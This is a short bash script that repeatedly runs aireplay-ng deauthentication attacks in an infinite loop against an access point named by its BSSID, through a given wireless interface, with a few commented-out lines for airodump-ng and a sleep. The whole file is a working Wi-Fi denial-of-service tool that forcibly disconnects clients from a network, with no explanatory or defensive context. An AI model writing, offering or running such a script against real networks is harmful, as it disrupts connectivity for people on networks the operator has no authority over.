#!/bin/bash
TIME=${1?Error: no time given}
BSSID=${2?Error: no bssid given}
INTERFACE=${3?Error: no interface given}
while :
do
echo "WAITING ....."
echo "bssid = "$BSSID "interface = "$INTERFACE
aireplay-ng --deauth $TIME -a $BSSID $INTERFACE
#airodump-ng wlan0mon
#((i++));
#sleep 5
done